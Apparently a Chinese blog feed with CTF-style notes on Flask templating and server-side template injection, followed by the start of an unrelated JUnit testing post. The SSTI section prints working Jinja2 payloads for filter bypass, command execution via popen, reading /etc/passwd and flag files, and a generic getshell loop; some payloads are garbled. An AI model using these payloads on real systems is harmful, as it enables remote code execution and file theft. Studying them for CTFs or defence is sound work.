 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app.debug = True
</span></span><span class="line"><span class="cl">app.run(debug=True)</span></span></code></pre></td></tr></table>
</div>
</div><p>加上debug就可以直接改代码后直接刷新进行显示保存的修改代码，不用重运行</p>
<h2 id="模板渲染" class="heading-element"><span>模板渲染！！！</span>
 <a href="#%e6%a8%a1%e6%9d%bf%e6%b8%b2%e6%9f%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h3 id="模板渲染体系" class="heading-element"><span>模板渲染体系</span>
 <a href="#%e6%a8%a1%e6%9d%bf%e6%b8%b2%e6%9f%93%e4%bd%93%e7%b3%bb" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><p><code>render_template</code>函数渲染的是<code>templates</code>中的模板</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">├── app.py 
</span></span><span class="line"><span class="cl">├── static 
</span></span><span class="line"><span class="cl">│ └── style.css 
</span></span><span class="line"><span class="cl">└── templates 
</span></span><span class="line"><span class="cl"> └── index.html</span></span></code></pre></td></tr></table>
</div>
</div><p>例如index.html里面有</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl"> &lt;head&gt;
</span></span><span class="line"><span class="cl"> &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt;
</span></span><span class="line"><span class="cl"> &lt;/head&gt;
</span></span><span class="line"><span class="cl"> &lt;body&gt;
</span></span><span class="line"><span class="cl"> &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt;
</span></span><span class="line"><span class="cl"> &lt;/body&gt;
</span></span><span class="line"><span class="cl">&lt;/html&gt;</span></span></code></pre></td></tr></table>
</div>
</div><p>其中<code>title</code>和<code>user.name</code></p>
<h3 id="flask-ssti" class="heading-element"><span>flask-SSTI</span>
 <a href="#flask-ssti" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><p>关键代码：用于渲染</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">render_template()</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>以下是无过滤情况的过程</p>
</blockquote>
<p>查找类</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;&#34;.__class__	# str</span></span></code></pre></td></tr></table>
</div>
</div><p>查找基类</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;&#34;.__class__.__bases__	# object
</span></span><span class="line"><span class="cl">&#34;&#34;.__class__.__mro__</span></span></code></pre></td></tr></table>
</div>
</div><p>查这个类的子类的集合</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;&#34;.__class__.__bases__[0].__subclasses__()	
</span></span><span class="line"><span class="cl"># [&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class...</span></span></code></pre></td></tr></table>
</div>
</div><p>找到合适的类，然后从合适的类中寻找我们需要的方法</p>
<p><code>&lt;class 'os._wrap_close'&gt;</code>，os命令相信你看到就感觉很亲切</p>
<h2 id="绕过tips" class="heading-element"><span>绕过tips</span>
 <a href="#%e7%bb%95%e8%bf%87tips" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h3 id="过滤等括号" class="heading-element"><span>过滤[]等括号</span>
 <a href="#%e8%bf%87%e6%bb%a4%e7%ad%89%e6%8b%ac%e5%8f%b7" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><p>使用gititem绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#34;&#34;.**class**.**bases**[0]}}	# 原
</span></span><span class="line"><span class="cl">{{&#34;&#34;.class.bases.getitem(0)}}	# 后</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="过滤subclasses" class="heading-element"><span>过滤subclasses</span>
 <a href="#%e8%bf%87%e6%bb%a4subclasses" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><p>拼凑法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#34;&#34;.class.bases[0].subclasses()}}	# 原
</span></span><span class="line"><span class="cl">{{&#34;&#34;.class.bases[0]&#39;subcla&#39;+&#39;sses&#39;}}	# 后</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="过滤class" class="heading-element"><span>过滤class</span>
 <a href="#%e8%bf%87%e6%bb%a4class" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><p>使用session</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{session[&#39;cla&#39;+&#39;ss&#39;].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}	# 原</span></span></code></pre></td></tr></table>
</div>
</div><p>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{session[&#39;__cla&#39;+&#39;ss__&#39;].__mro__[12]}}
</span></span><span class="line"><span class="cl">request[&#39;__cl&#39;+&#39;ass__&#39;].__mro__[12]}}</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="timeit姿势" class="heading-element"><span>timeit姿势</span>
 <a href="#timeit%e5%a7%bf%e5%8a%bf" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><blockquote>
<p>例题：2017 swpu-ctf</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import timeit
</span></span><span class="line"><span class="cl">timeit.timeit(&#34;__import__(&#39;os&#39;).system(&#39;dir&#39;)&#34;,number=1)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import platform
</span></span><span class="line"><span class="cl">print platform.popen(&#39;dir&#39;).read()</span></span></code></pre></td></tr></table>
</div>

<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 读文件</span>
</span></span><span class="line"><span class="cl"><span class="c1">#读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用</span>
</span></span><span class="line"><span class="cl"><span class="p">{{[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span> 
</span></span><span class="line"><span class="cl"><span class="p">{{[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">257</span><span class="p">](</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span> <span class="p">(</span><span class="n">python3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#直接使用popen命令，python2是非法的，只限于python3</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">_wrap_close</span> <span class="err">类里有</span><span class="n">popen</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">128</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">128</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#调用os的popen执行命令</span>
</span></span><span class="line"><span class="cl"><span class="c1">#python2、python3通用</span>

</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#通用 getshell</span>
</span></span><span class="line"><span class="cl"><span class="err">原理就是找到含有</span> <span class="n">__builtins__</span> <span class="err">的类，然后利用。</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">__name__</span><span class="o">==</span><span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}{{</span> <span class="n">c</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span><span class="p">)</span> <span class="p">}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">__name__</span><span class="o">==</span><span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}{{</span> <span class="n">c</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="漏洞挖掘" class="heading-element"><span>漏洞挖掘</span>
 <a href="#%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><p><img loading="lazy" src="..%5cimg%5c%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a51.png" alt="较全的反映了ssti的一些模板渲染引擎及利用" srcset="..%5cimg%5c%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a51.png?size=small, ..%5cimg%5c%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a51.png?size=medium 1.5x, ..%5cimg%5c%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a51.png?size=large 2x" data-title="较全的反映了ssti的一些模板渲染引擎及利用" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>

item.title: JAVA测试用例书写
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="测试用例书写步骤" class="heading-element"><span>测试用例书写步骤</span>
 <a href="#%e6%b5%8b%e8%af%95%e7%94%a8%e4%be%8b%e4%b9%a6%e5%86%99%e6%ad%a5%e9%aa%a4" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="以maven管理的项目为例" class="heading-element"><span>以Maven管理的项目为例</span>
 <a href="#%e4%bb%a5maven%e7%ae%a1%e7%90%86%e7%9a%84%e9%a1%b9%e7%9b%ae%e4%b8%ba%e4%be%8b" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><blockquote>
<p>使用JUnit框架内的相关工具进行测试</p>
</blockquote>
<h3 id="步骤" class="heading-element"><span>步骤</span>
 <a href="#%e6%ad%a5%e9%aa%a4" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><ol>
<li>使用maven管理项目在pox.xml中加入dependency</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> &lt;dependency&gt;
</span></span><span class="line"><span class="cl"> &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;
</span></span><span class="line"><span class="cl"> &lt;artifactId&gt;junit-jupiter&lt;/artifactId&gt;
</span></span><span class="line"><span class="cl"> &lt;version&gt;5.8.1&lt;/version&gt;
</span></span><span class="line"><span class="cl"> &lt;scope&gt;compile&lt;/scope&gt;
</span></span><span class="line"><span class="cl"> &lt;/dependency&gt;</span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>在类中导入要用的相关内容
<div class="highlight"><div class="chroma">
